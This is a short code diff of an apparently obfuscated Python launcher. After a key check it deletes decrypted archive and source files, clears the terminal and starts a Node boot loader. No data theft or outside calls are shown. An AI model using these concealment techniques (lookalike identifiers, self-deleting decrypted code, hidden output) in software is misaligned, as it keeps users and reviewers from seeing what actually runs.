@@ -161,14 +161,13 @@ if ᴠʟᴋʏʀᴇi is not None:
     
     try:
         from xp0edoc import *
-
         if ᴠʟᴋʏʀᴇi in YYUCCitinZfgQdrclRPOP:
             os.remove("xp0e.zip")
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__")
             os.system("clear")
-            os.system('node ./ᴠʟᴋʏʀᴇ🔌cord/𝕭𝖔𝖔𝖙☢𝕷𝖔𝖆𝖉𝖊𝖗.js')
+            os.system('node ᴠʟᴋʏʀᴇ🔌cord/𝕭𝖔𝖔𝖙☢𝕷𝖔𝖆𝖉𝖊𝖗.js')
         else:
             os.remove("xp0e.zip")
             os.remove("xp0e.aes")
@@ -179,6 +178,7 @@ if ᴠʟᴋʏʀᴇi is not None:
             exit
             pass
     except Exception as e:
+        os.system("clear")
         if ᴠʟᴋʏʀᴇ == "HEROKU":
             LOGS.info(str(e))
         else:
